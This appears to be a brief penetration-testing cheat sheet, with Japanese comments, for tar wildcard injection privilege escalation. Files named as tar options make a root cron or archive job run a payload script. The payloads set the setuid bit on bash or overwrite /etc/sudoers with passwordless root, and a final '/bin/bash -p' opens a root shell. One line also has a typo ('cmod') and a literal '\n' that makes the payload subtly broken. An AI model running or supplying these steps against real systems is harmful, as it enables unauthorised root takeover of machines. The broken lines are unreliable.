# WildCard Injection

``` shell
    #tar .... /*を利用
    #tarの圧縮ディレクトリで実行
    echo '#!/bin/bash\ncmod +s /bin/bash' > shell.sh
    #または
    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
    #もしくはこれでもいい。
    echo 'echo "kali ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
    # exec=のあとに任意のコマンドを実行できる
    echo "" > "--checkpoint-action=exec= sh shell.sh"
    echo "" > --checkpoint=1
    # 攻撃側の端末で実行するとrootが取れる
    /bin/bash -p
```
